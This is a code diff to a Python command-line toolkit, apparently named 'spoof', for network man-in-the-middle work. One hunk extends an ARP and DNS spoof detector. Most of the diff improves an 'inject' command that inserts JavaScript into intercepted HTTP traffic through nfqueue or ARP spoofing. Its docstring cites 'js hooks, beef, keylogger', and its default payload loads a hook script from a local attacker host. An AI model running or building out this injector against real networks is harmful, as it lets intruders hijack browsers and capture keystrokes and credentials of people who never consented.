@@ -614,6 +614,9 @@ def detect(
     interface: Optional[str] = typer.Option(
         None, "--interface", "-i", help="network interface",
     ),
+    gateway: Optional[str] = typer.Option(
+        None, "--gateway", "-g", help="gateway ip for better accuracy",
+    ),
     export: Optional[str] = typer.Option(
         None, "--export", help="export alerts to json file",
     ),
@@ -628,21 +631,35 @@ def detect(
         raise typer.Exit(1)
 
     render_banner(console)
-    detector = SpoofDetector(interface=iface)
+
+    gw_ip = gateway
+    if not gw_ip:
+        try:
+            import scapy.all as _scapy
+            gw_ip = _scapy.conf.route.route("0.0.0.0")[2]
+            if gw_ip == "0.0.0.0":
+                gw_ip = None
+        except Exception:
+            pass
+
+    detector = SpoofDetector(interface=iface, gateway_ip=gw_ip)
     detector.start()
 
     console.print(Panel(
         f"[bold cyan]spoof detector active[/bold cyan] on [green]{iface}[/green]\n"
-        "[dim]monitoring ARP + DNS traffic for anomalies[/dim]",
+        f"[dim]gateway: {gw_ip or 'auto-detect'} | "
+        f"ARP conflict + flood + DNS timing + gratuitous ARP[/dim]",
         border_style="cyan",
     ))
 
     try:
         import time
         while True:
-            time.sleep(5)
+            time.sleep(4)
             if detector.alerts:
                 detector.display_alerts(console)
+            else:
+                detector.display_status(console)
     except KeyboardInterrupt:
         console.print("\n[yellow]stopping...[/yellow]")
         detector.stop()
@@ -661,15 +678,21 @@ def inject(
         '<script src="http://192.168.1.100:3000/hook.js"></script>',
         "--code", "-c", help="javascript/html code to inject",
     ),
+    payload_file: Optional[str] = typer.Option(
+        None, "--payload-file", "-f", help="load injection code from file",
+    ),
     mode: str = typer.Option(
-        "scapy", "--mode", "-m", help="injection mode: scapy (cross-platform) or nfqueue (linux only)",
+        "nfqueue", "--mode", "-m", help="injection mode: nfqueue (linux, reliable) or scapy",
     ),
     inject_pos: str = typer.Option(
         "append", "--position", "-p", help="injection position: append (</body>), head (</head>), prepend",
     ),
+    url_filter: Optional[str] = typer.Option(
+        None, "--url-filter", help="regex filter to only inject matching urls",
+    ),
 ):
     """inject code into http responses (js hooks, beef, keylogger)"""
-    from spoof.injector import create_injector
+    from spoof.injector import NfqueueHTTPInjector
 
     platform = get_platform()
     iface = interface or platform.get_default_interface()
@@ -678,16 +701,30 @@ def inject(
         raise typer.Exit(1)
 
     render_banner(console)
-    injector = create_injector(
-        mode=mode, interface=iface,
-        injection_code=code, injection_mode=inject_pos,
-    )
+
+    if mode == "scapy":
+        from spoof.injector import ScapyHTTPInjector
+        injector = ScapyHTTPInjector(interface=iface, injection_code=code,
+                                     injection_mode=inject_pos, url_filter=url_filter)
+        console.print("[yellow]scapy mode: requires ARP spoofing + ip_forward to be in-path[/yellow]")
+    else:
+        injector = NfqueueHTTPInjector(interface=iface, injection_code=code,
+                                       injection_mode=inject_pos, url_filter=url_filter)
+
+    if payload_file:
+        if not injector.load_payload_file(payload_file):
+            console.print(f"[red]failed to load payload: {payload_file}[/red]")
+            raise typer.Exit(1)
+        console.print(f"[green]payload loaded from:[/green] {payload_file}")
+
     injector.start()
 
+    code_preview = code[:60] + ("..." if len(code) > 60 else "")
     console.print(Panel(
         f"[bold green]code injector active[/bold green] on [cyan]{iface}[/cyan]\n"
-        f"[dim]mode: {mode} | position: {inject_pos}[/dim]\n"
-        f"[dim]payload ({len(code)}B):[/dim] {code[:80]}{'...' if len(code) > 80 else ''}",
+        f"[dim]mode: {mode} | position: {inject_pos}"
+        f"{' | url filter: ' + url_filter if url_filter else ''}[/dim]\n"
+        f"[dim]payload ({len(injector._injection_code)}B):[/dim] {code_preview}",
         border_style="green",
     ))
 
@@ -696,7 +733,10 @@ def inject(
         while True:
             time.sleep(5)
             s = injector.stats
-            console.print(f"[dim]injected: {s['injected']} | scanned: {s['scanned']} | skipped: {s['skipped']}[/dim]")
+            console.print(
+                f"[dim]injected: {s['injected']} | scanned: {s['scanned']} | "
+                f"skipped: {s['skipped']} | errors: {s['errors']}[/dim]"
+            )
     except KeyboardInterrupt:
         console.print("\n[yellow]stopping...[/yellow]")
         injector.stop()
